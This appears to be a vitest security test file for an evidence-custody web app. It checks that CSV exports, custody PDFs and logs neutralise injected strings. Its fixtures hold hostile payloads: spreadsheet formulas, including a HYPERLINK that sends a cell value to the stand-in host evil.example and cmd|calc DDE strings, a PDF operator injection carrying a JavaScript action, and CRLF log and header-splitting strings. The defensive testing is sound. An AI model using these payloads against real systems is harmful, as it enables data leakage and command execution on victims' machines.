/**
 * Output-injection checks (security round 2): spreadsheet formula injection in CSV reports and the audit CSV
 * export, PDF operator / CRLF injection in the custody report PDF and report PDFs, and log-line injection via
 * CRLF in attacker-controlled fields (usernames at login). Attacker-controlled strings enter through evidence
 * metadata (PATCH /evidence/:id), case notes and the login username (which is recorded as actor_name).
 */
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Writable } from 'node:stream';
import pino from 'pino';
import type { FastifyInstance } from 'fastify';
import { closeApp, login, type Agent } from './helpers.js';
import { evidenceTestSetup, evidenceTestTeardown, userId } from './evidence-setup.js';
import { createRegisteredEvidence } from './fixtures/evidence.js';
import { runReportBuild } from '../../worker/src/jobs/reports/build.js';
import { pdfAttachment } from './custody-support.js';

let app: FastifyInstance;
let meera: Agent;
let kavya: Agent;
let auditor: Agent;
let evId: string;
const TAG = `inj${Date.now().toString(36)}`;
const FORMULAS = ['=HYPERLINK("http://evil.example/?x="&A1,"click")', '+cmd|\' /C calc\'!A0', '-2+3+cmd|x', '@SUM(1+1)*cmd|x', '\t=1+1', '\r=1+1'];
const PDF_ATTACK = `${TAG}) Tj ET BT /F1 99 Tf (PWNED) Tj ET\r\nendstream endobj 9999 0 obj << /Type /Action /S /JavaScript /JS (app.alert(1)) >>`;

let dir: string;
beforeAll(async () => {
  app = await evidenceTestSetup();
  [meera, kavya, auditor] = await Promise.all([login('io.meera'), login('sup.kavya'), login('aud.suresh')]);
  evId = (await createRegisteredEvidence({ orgCode: 'ps_cubbonpark', uploadedBy: await userId('io.meera') })).id;
  expect((await meera.patch(`/api/v1/evidence/${evId}`, { title: `${FORMULAS[0]} ${TAG}`, description: PDF_ATTACK, locationText: FORMULAS[1] })).status).toBe(200);
  dir = mkdtempSync(join(tmpdir(), 'ksp-inj-'));
}, 300_000);
afterAll(async () => {
  rmSync(dir, { recursive: true, force: true });
  await evidenceTestTeardown();
  await closeApp();
});

/** Parse RFC-4180 CSV (quoted fields, "" escapes, CRLF/LF records) into rows of cells. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let q = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i]!;
    if (q) {
      if (c === '"' && text[i + 1] === '"') { cell += '"'; i++; } else if (c === '"') q = false; else cell += c;
    } else if (c === '"') q = true;
    else if (c === ',') { row.push(cell); cell = ''; } else if (c === '\n' || c === '\r') {
      if (c === '\r' && text[i + 1] === '\n') i++;
      row.push(cell); rows.push(row); row = []; cell = '';
    } else cell += c;
  }
  if (cell || row.length) { row.push(cell); rows.push(row); }
  return rows;
}
const dangerous = (cell: string) => /^[=+\-@\t\r]/.test(cell) && !/^-?\d+(\.\d+)?$/.test(cell);

describe('CSV formula injection', () => {
  it('report CSV (chain-of-custody summary) neutralises formula-leading cells', async () => {
    const r = await kavya.post('/api/v1/reports/runs', { reportType: 'CHAIN_OF_CUSTODY_SUMMARY', format: 'CSV' });
    expect(r.status).toBe(201);
    await runReportBuild({ db: app.db, storage: app.storage }, r.body.id);
    const link = await kavya.post(`/api/v1/reports/runs/${r.body.id}/download-link`);
    const csv = (await app.inject({ method: 'GET', url: link.body.url })).body;
    const rows = parseCsv(csv);
    const mine = rows.filter((row) => row.some((c) => c.includes(TAG)));
    expect(mine.length).toBeGreaterThan(0);
    const bad = rows.flat().filter(dangerous);
    expect(bad).toEqual([]);
    expect(mine.flat().some((c) => c.startsWith(`'=HYPERLINK`))).toBe(true);
  });

  it('audit CSV export neutralises attacker-chosen usernames recorded as actor_name', async () => {
    for (const f of FORMULAS) {
      const res = await app.inject({ method: 'POST', url: '/api/v1/auth/login', remoteAddress: '10.55.0.1', payload: { username: `${f}${TAG}`.slice(0, 64), password: 'x' } });
      expect(res.statusCode).toBe(401);
    }
    const r = await auditor.post('/api/v1/audit/export', { format: 'csv', filters: { action: 'LOGIN_FAILED', from: new Date(Date.now() - 120_000).toISOString() } });
    expect(r.status).toBeLessThan(300);
    const dl = await app.inject({ method: 'GET', url: r.body.downloadUrl, headers: { cookie: [...auditor.cookies].map(([k, v]) => `${k}=${v}`).join('; ') } });
    expect(dl.statusCode).toBe(200);
    const rows = parseCsv(dl.body);
    expect(rows.length).toBeGreaterThan(1);
    expect(rows.flat().filter(dangerous)).toEqual([]);
    // Every record has exactly the header's column count: CR/LF/quotes inside cells cannot forge extra records.
    const width = rows[0]!.length;
    expect(rows.filter((row) => row.length > 1).every((row) => row.length === width)).toBe(true);
  });
});

function pdfToText(buf: Buffer, name: string): string {
  const f = join(dir, name);
  writeFileSync(f, buf);
  return execFileSync('pdftotext', ['-layout', f, '-'], { encoding: 'utf8' });
}

describe('PDF injection', () => {
  it('custody report PDF renders operator/CRLF strings as text and stays structurally valid', async () => {
    expect((await meera.post(`/api/v1/cases`, { title: `Case ${PDF_ATTACK}`.slice(0, 200) })).status).toBe(201);
    const r = await meera.get(`/api/v1/custody/evidence/${evId}/report.pdf`);
    expect(r.status).toBe(200);
    const raw = await app.inject({ method: 'GET', url: `/api/v1/custody/evidence/${evId}/report.pdf`, headers: { cookie: [...meera.cookies].map(([k, v]) => `${k}=${v}`).join('; ') } });
    const pdf = raw.rawPayload;
    expect(pdf.subarray(0, 5).toString()).toBe('%PDF-');
    // The attack text only ever occurs inside the embedded, signed custody-payload.json (a length-delimited stream,
    // JSON-escaped: no raw CR/LF) — never in page content, where pdfkit draws text as hex strings. See SEC-15.
    const latin = pdf.toString('latin1');
    const count = (h: string, n: string) => h.split(n).length - 1;
    const att = pdfAttachment(pdf, 'custody-payload.json').toString('latin1');
    expect(count(latin, 'PWNED) Tj')).toBe(count(att, 'PWNED) Tj'));
    expect(count(latin, '/JS (app.alert(1))')).toBe(count(att, '/JS (app.alert(1))'));
    expect(att).not.toContain('\r\nendstream');
    expect(latin).not.toMatch(/\/OpenAction|\/AA\s*<</);
    const text = pdfToText(pdf, 'custody.pdf');
    expect(text).toContain(TAG); // the attack string is present as rendered TEXT, i.e. it was escaped, not executed
  });

  it('report PDF (chain-of-custody summary) is equally safe', async () => {
    const r = await kavya.post('/api/v1/reports/runs', { reportType: 'CHAIN_OF_CUSTODY_SUMMARY', format: 'PDF' });
    expect(r.status).toBe(201);
    await runReportBuild({ db: app.db, storage: app.storage }, r.body.id);
    const link = await kavya.post(`/api/v1/reports/runs/${r.body.id}/download-link`);
    const pdf = (await app.inject({ method: 'GET', url: link.body.url })).rawPayload;
    expect(pdf.subarray(0, 5).toString()).toBe('%PDF-');
    expect(pdf.toString('latin1')).not.toMatch(/\/S\s*\/JavaScript/);
    expect(pdfToText(pdf, 'report.pdf')).toContain(TAG);
  });
});

describe('log-line injection', () => {
  it('structured (JSON) logs keep CRLF inside one record', () => {
    const lines: string[] = [];
    const sink = new Writable({ write(chunk, _e, cb) { lines.push(...chunk.toString().split('\n').filter(Boolean)); cb(); } });
    const log = pino({ level: 'info' }, sink);
    log.warn({ username: 'evil\r\n{"level":50,"msg":"forged admin login"}', url: '/api/v1/x%0d%0aSet-Cookie:a=1' }, 'login failed');
    expect(lines).toHaveLength(1);
    const rec = JSON.parse(lines[0]!);
    expect(rec.username).toContain('\r\n');
    expect(rec.level).toBe(40);
  });

  it('CRLF in response header values is impossible (Node refuses), so reflected ids cannot split headers', async () => {
    const r = await app.inject({ method: 'GET', url: '/api/v1/auth/me', headers: { 'x-request-id': 'abc\r\nSet-Cookie: pwn=1' } });
    expect(r.headers['set-cookie']).toBeUndefined();
    expect(r.statusCode).toBeLessThan(500);
  });
});
